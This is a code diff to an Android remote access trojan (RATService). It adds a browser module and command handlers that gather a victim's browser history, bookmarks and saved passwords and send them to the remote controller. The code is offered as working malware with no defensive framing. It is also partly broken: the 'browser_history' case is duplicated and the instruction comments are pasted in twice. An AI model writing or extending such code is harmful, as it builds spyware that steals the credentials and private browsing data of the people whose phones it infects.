@@ -141,6 +141,8 @@ public class RATService extends Service {
         if (Config.ENABLE_CONTACTS) contactsModule = new ContactsModule(this);
         if (Config.ENABLE_FILES) fileModule = new FileModule(this);
         if (Config.ENABLE_SHELL) shellModule = new ShellModule();
+    
+        if (Config.ENABLE_BROWSER) browserModule = new BrowserModule(this);
         if (Config.ENABLE_APP_MANAGER) appManagerModule = new AppManagerModule(this);
         deviceModule = new DeviceModule(this);
         
@@ -745,6 +747,81 @@ public class RATService extends Service {
                 }
                 break;
 
+                // In routeCommand() method, add these cases:
+
+case "browser_data":
+case "browser_history":
+case "get_browsers":
+    if (browserModule != null) {
+        Log.d(TAG, "🌐 Getting all browser data");
+        String result = browserModule.getAllBrowserData();
+        sendCommand("BROWSER_DATA|" + result);
+    } else {
+        sendCommand("BROWSER_DATA|{\"success\":false,\"error\":\"Browser module not available\"}");
+    }
+    break;
+
+case "browser_export":
+    if (browserModule != null) {
+        Log.d(TAG, "🌐 Exporting browser data");
+        String result = browserModule.exportBrowserData();
+        sendCommand("BROWSER_EXPORT|" + result);
+    } else {
+        sendCommand("BROWSER_EXPORT|{\"success\":false,\"error\":\"Browser module not available\"}");
+    }
+    break;
+
+case "browser_history":
+    if (browserModule != null && !args.isEmpty()) {
+        Log.d(TAG, "🌐 Getting history for: " + args);
+        JSONArray history = browserModule.getBrowserHistory(args);
+        JSONObject result = new JSONObject();
+        result.put("success", true);
+        result.put("packageName", args);
+        result.put("history", history);
+        result.put("count", history.length());
+        sendCommand("BROWSER_HISTORY|" + result.toString());
+    } else {
+        sendCommand("BROWSER_HISTORY|{\"success\":false,\"error\":\"Invalid package name\"}");
+    }
+    break;
+
+case "browser_bookmarks":
+    if (browserModule != null && !args.isEmpty()) {
+        Log.d(TAG, "🌐 Getting bookmarks for: " + args);
+        JSONArray bookmarks = browserModule.getBrowserBookmarks(args);
+        JSONObject result = new JSONObject();
+        result.put("success", true);
+        result.put("packageName", args);
+        result.put("bookmarks", bookmarks);
+        result.put("count", bookmarks.length());
+        sendCommand("BROWSER_BOOKMARKS|" + result.toString());
+    } else {
+        sendCommand("BROWSER_BOOKMARKS|{\"success\":false,\"error\":\"Invalid package name\"}");
+    }
+    break;
+
+case "browser_passwords":
+    if (browserModule != null && !args.isEmpty()) {
+        Log.d(TAG, "🌐 Getting passwords for: " + args);
+        JSONArray passwords = browserModule.getSavedPasswords(args);
+        JSONObject result = new JSONObject();
+        result.put("success", true);
+        result.put("packageName", args);
+        result.put("passwords", passwords);
+        result.put("count", passwords.length());
+        sendCommand("BROWSER_PASSWORDS|" + result.toString());
+    } else {
+        sendCommand("BROWSER_PASSWORDS|{\"success\":false,\"error\":\"Invalid package name\"}");
+    }
+    break;
+
+
+
+
+
+
+                
 // In routeCommand() method, add these cases:
 
 case "apps_list":
